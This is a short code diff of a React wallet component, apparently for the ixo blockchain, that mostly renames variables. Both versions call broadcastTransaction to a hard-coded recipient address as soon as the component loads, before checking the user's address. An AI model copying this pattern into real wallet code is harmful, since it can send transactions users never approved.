@@ -32,17 +32,18 @@ export default function WalletInfo({ onLoad = (isError) => {} }) {
   );
   async function init() {
     try {
-      const tempAddress = await getAddress();
-      broadcastTransaction("ixo1wfvqcamfzqq6y0j75r3n9ascj3tuvup3jqtnwc");
-      if (!tempAddress) {
+      const userAddress = await getAddress();
+      const toAddressScanned = "ixo1wfvqcamfzqq6y0j75r3n9ascj3tuvup3jqtnwc"
+      broadcastTransaction(toAddressScanned)
+      if (!userAddress) {
         setIsError(true);
         setIsLoading(false);
         onLoad(true);
         return;
       }
       await getAddress();
-      setBalance("0");
-      setPubAddress(tempAddress);
+      setBalance(0);
+      setPubAddress(userAddress);
       setIsLoading(false);
       onLoad(false);
     } catch (error) {
